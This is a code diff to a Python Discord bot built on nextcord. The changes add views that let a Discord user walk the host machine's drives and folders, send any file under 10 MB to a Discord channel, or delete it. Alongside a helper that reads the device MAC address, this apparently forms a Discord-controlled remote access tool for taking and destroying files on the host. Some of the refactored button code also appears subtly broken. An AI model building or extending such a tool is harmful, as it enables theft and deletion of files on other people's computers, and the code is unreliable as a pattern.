@@ -103,6 +103,55 @@ def get_device_ip():
     mac = hex(uuid.getnode()).replace('0x', '').upper()
     return ':'.join(mac[i:i+2] for i in range(0, 12, 2))
 
+class FileOptionsView(nextcord.ui.View):
+    def __init__(self, file_path, current_path, history):
+        super().__init__()
+        self.file_path = file_path
+        self.current_path = current_path
+        self.history = history
+        
+        file_size = os.path.getsize(file_path) / (1024 * 1024)
+        self.add_item(nextcord.ui.Button(label=f"Selected: {os.path.basename(file_path)}", disabled=True))
+        
+        send_btn = nextcord.ui.Button(label="Send", style=nextcord.ButtonStyle.green)
+        send_btn.disabled = file_size >= 10
+        send_btn.callback = self.send_file
+        self.add_item(send_btn)
+        
+        delete_btn = nextcord.ui.Button(label="Delete", style=nextcord.ButtonStyle.danger)
+        delete_btn.callback = self.delete_file
+        self.add_item(delete_btn)
+        
+        back_btn = nextcord.ui.Button(label="Back", style=nextcord.ButtonStyle.blurple)
+        back_btn.callback = self.go_back
+        self.add_item(back_btn)
+        
+        close_btn = nextcord.ui.Button(label="Close", style=nextcord.ButtonStyle.grey)
+        close_btn.callback = self.close
+        self.add_item(close_btn)
+
+    async def send_file(self, interaction):
+        try:
+            await interaction.channel.send(file=nextcord.File(self.file_path))
+            await interaction.response.edit_message(content="✅ File sent!", view=None)
+        except:
+            await interaction.response.edit_message(content="❌ Failed to send file!", view=None)
+
+    async def delete_file(self, interaction):
+        try:
+            os.remove(self.file_path)
+            await interaction.response.edit_message(content="🗑️ File deleted!", view=None)
+        except:
+            await interaction.response.edit_message(content="❌ Delete failed!", view=None)
+
+    async def go_back(self, interaction):
+        view = FileView(self.current_path, self.history)
+        await interaction.response.edit_message(content=f"Path: {self.current_path}", view=view)
+
+    async def close(self, interaction):
+        await interaction.message.delete()
+        self.stop()
+
 class FileView(nextcord.ui.View):
     def __init__(self, current_path, history, page=0):
         super().__init__()
@@ -111,85 +160,57 @@ class FileView(nextcord.ui.View):
         self.page = page
 
         contents = self.get_contents()
-        total_items = len(contents)
         max_per_page = 21
-
         start_index = self.page * max_per_page
-        end_index = start_index + max_per_page
-        current_page_items = contents[start_index:end_index]
+        current_page_items = contents[start_index:start_index + max_per_page]
 
         for name, is_dir in current_page_items:
             style = nextcord.ButtonStyle.primary if is_dir else nextcord.ButtonStyle.secondary
-            custom_id = f"dir:{name}" if is_dir else f"file:{name}"
-            button = nextcord.ui.Button(label=name, style=style, custom_id=custom_id)
-            button.callback = self.create_callback(custom_id)
+            button = nextcord.ui.Button(label=name, style=style)
+            button.callback = self.create_callback(name, is_dir)
             self.add_item(button)
 
         if self.page > 0:
-            up_btn = nextcord.ui.Button(emoji="⬆️", style=nextcord.ButtonStyle.grey)
-            up_btn.callback = self.prev_page
-            self.add_item(up_btn)
-        
-        if total_items > end_index:
-            down_btn = nextcord.ui.Button(emoji="⬇️", style=nextcord.ButtonStyle.grey)
-            down_btn.callback = self.next_page
-            self.add_item(down_btn)
-
+            self.add_item(nextcord.ui.Button(emoji="⬆️", style=nextcord.ButtonStyle.grey, callback=self.prev_page))
+        if len(contents) > start_index + max_per_page:
+            self.add_item(nextcord.ui.Button(emoji="⬇️", style=nextcord.ButtonStyle.grey, callback=self.next_page))
         if self.history:
-            back_btn = nextcord.ui.Button(label="Back", style=nextcord.ButtonStyle.red)
-            back_btn.callback = self.back
-            self.add_item(back_btn)
-
-        close_btn = nextcord.ui.Button(label="Close", style=nextcord.ButtonStyle.red)
-        close_btn.callback = self.close
-        self.add_item(close_btn)
+            self.add_item(nextcord.ui.Button(label="Back", style=nextcord.ButtonStyle.red, callback=self.back))
+        self.add_item(nextcord.ui.Button(label="Close", style=nextcord.ButtonStyle.grey, callback=self.close))
 
     def get_contents(self):
         if self.current_path is None:
-            if os.name == 'nt':
-                return sorted([(f"{d}:\\", True) for d in string.ascii_uppercase if os.path.exists(f"{d}:")], key=lambda x: x[0])
-            return []
+            return sorted([(f"{d}:\\", True) for d in string.ascii_uppercase if os.path.exists(f"{d}:")], key=lambda x: x[0]) if os.name == 'nt' else []
         try:
-            items = []
-            for item in os.listdir(self.current_path):
-                path = os.path.join(self.current_path, item)
-                items.append((item, os.path.isdir(path)))
+            items = [(item, os.path.isdir(os.path.join(self.current_path, item))) for item in os.listdir(self.current_path)]
             return sorted(items, key=lambda x: (not x[1], x[0]))
         except:
             return []
 
-    def create_callback(self, custom_id):
+    def create_callback(self, name, is_dir):
         async def callback(interaction):
-            if custom_id.startswith("dir:"):
-                dir_name = custom_id.split(":", 1)[1]
-                new_path = os.path.join(self.current_path, dir_name) if self.current_path else dir_name
-                new_history = self.history + [(self.current_path, self.page)]
-                view = FileView(new_path, new_history)
+            if is_dir:
+                new_path = os.path.join(self.current_path, name) if self.current_path else name
+                view = FileView(new_path, self.history + [(self.current_path, self.page)])
                 await interaction.response.edit_message(content=f"Path: {new_path}", view=view)
-            elif custom_id.startswith("file:"):
-                file_name = custom_id.split(":", 1)[1]
-                file_path = os.path.join(self.current_path, file_name)
-                if os.path.isfile(file_path):
-                    await interaction.response.send_message(file=nextcord.File(file_path))
-                else:
-                    await interaction.response.send_message("File not found", ephemeral=True)
+            else:
+                file_path = os.path.join(self.current_path, name) if self.current_path else name
+                view = FileOptionsView(file_path, self.current_path, self.history)
+                await interaction.response.edit_message(content=f"File: {name}\nSize: {os.path.getsize(file_path)/1024:.1f}KB", view=view)
         return callback
 
     async def prev_page(self, interaction):
         view = FileView(self.current_path, self.history, self.page - 1)
-        await interaction.response.edit_message(content=f"Path: {self.current_path}", view=view)
+        await interaction.response.edit_message(view=view)
 
     async def next_page(self, interaction):
         view = FileView(self.current_path, self.history, self.page + 1)
-        await interaction.response.edit_message(content=f"Path: {self.current_path}", view=view)
+        await interaction.response.edit_message(view=view)
 
     async def back(self, interaction):
-        if self.history:
-            prev_path, prev_page = self.history[-1]
-            view = FileView(prev_path, self.history[:-1], prev_page)
-            await interaction.response.edit_message(content=f"Path: {prev_path}", view=view)
-        else:
-            await interaction.response.defer()
+        prev_path, prev_page = self.history[-1]
+        view = FileView(prev_path, self.history[:-1], prev_page)
+        await interaction.response.edit_message(content=f"Path: {prev_path}", view=view)
 
     async def close(self, interaction):
         await interaction.message.delete()
